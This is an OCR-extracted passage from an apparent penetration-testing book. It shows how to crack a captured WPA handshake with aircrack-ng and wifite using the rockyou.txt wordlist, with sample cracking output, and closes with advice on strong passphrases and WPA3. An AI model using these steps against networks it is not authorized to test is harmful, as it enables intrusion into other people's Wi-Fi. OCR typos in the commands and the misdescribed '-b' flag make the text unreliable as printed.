- img_proc: true
  md: 'Wifite couldn''t crack the file there are several ways you can try to crack
    it. One way is to use "Aircrack-ng" to crack the handshake. Just use the capture
    file provided by Wifite and feed it to Airc-ng with a wordlist file. Here is an
    example using the ever popular rockyou.txt wordlist. The wordlist is compressed,
    so you need to de-compress it before you use it – just right click on it and select
    "open with archive manager" and extract it to the current wordlist directory.
    You can then use the wordlist in attacks as seen below:


    ```

    airrack-ng -a 2 -b 01:00:32:21:1a:a3 -w /usr/share/wordlists/rockyou.txt

    handshake_Dlink_c01-00-32-21-1a-a3_2018-07-27T16-08-57.cap

    ```


    +   - "a 2"\u201d tells it to use Wifi

    - "b"\u201d is the SSID of the router

    - "w"\u201d is the wordlist


    Lastly, you just use the filename of the handshake.cap file that was saved in
    the

    "hs" directory.


    When the command is executed it automatically begins cracking the handshake

    key:


    ```

    00:00:07] 31984/9822768 keys tested (4643.73 k/s)

    Time left: 35 minutes, 8 seconds                0.33%

    Current passphrase: candygurl1

    Master Key      : 17 ED F8 62 DC 36 1C EB 4F 92 E2 71 A7 31 76 83

    95 CF D1 FF 29 83 D5 07 7A FA DO 43 61 A8 9F 7A C3

    Transient Key   : C8 B1 9F 47 37 72 1E 35 6A 7E C0 3D 69 99 2A 73

    B9 71 05 31 08 67 FC F8 5E D2 3B 21 F9 9F D00

    B5 2A 0E 0F 1A 8E 7A EA FC 6C 80 CE 52 73 8B CE

    01 E5 1B 7F 32 53 07 AE EC 8E 80 FA 25 79 6D E4

    EAPOL HMAC     : 72 4F FF 6E 55 7E 1C 46 F0 46 F0 02 25 C7 D9 9B 00

    ```


    Wifite will also give you the commands to crack the handshake files using

    multiple programs with a specific dictionary. This is accomplished by running

    WiFi using the "--crack" and "--dict [wordlist path]" switches. As seen below:'
  merge: -1
  pgno: 351
- img_proc: true
  md: "```\nroot@kali:~# wifite --wrack --dict /usr/share/wordlists/rockyou.txt\n\
    \ wifite 2.1.6\n : automated wireless auditor\n https://github.com/derv82/wifite\n\
    \n [+] option: using wordlist /usr/share/wordlists/rockyou.txt to crack WPA handshakes\n\
    [-] Listing captured handshakes from /root/hs\n```\n\nYou will be told which handshake\
    \ file you want to crack and then it will list the commands you ran to attempt\
    \ to crack the file. Some of the programs require you to process the handshake\
    \ file before it can crack it. The processing commands needed are also given to\
    \ you.\n\n# Conclusion\n\nIn this section we covered how easy it can be to obtain\
    \ the Wi-Fi WPA key from a router that is using a simple password. Both of the\
    \ wireless testing tools presented in this chapter allowed us to quickly find\
    \ and test nearby wireless networks. Both attacks worked by de-authenticating\
    \ a user attached to the router, and then capturing and cracking the WPA key with\
    \ a dictionary attack. Lastly, we covered how WiFi provides commands to crack\
    \ more difficult WPA keys using standard cracking tools.\n\nHopefully this chapter\
    \ showed how easy it can be to both find and gain access to insecure Wi-Fi routers.\
    \ Choosing long complex passphrase will help secure your wireless network from\
    \ attackers. Also, implementing WPA3 Wi-Fi devices, when they become available,\
    \ will do a lot to help secure wireless networks."
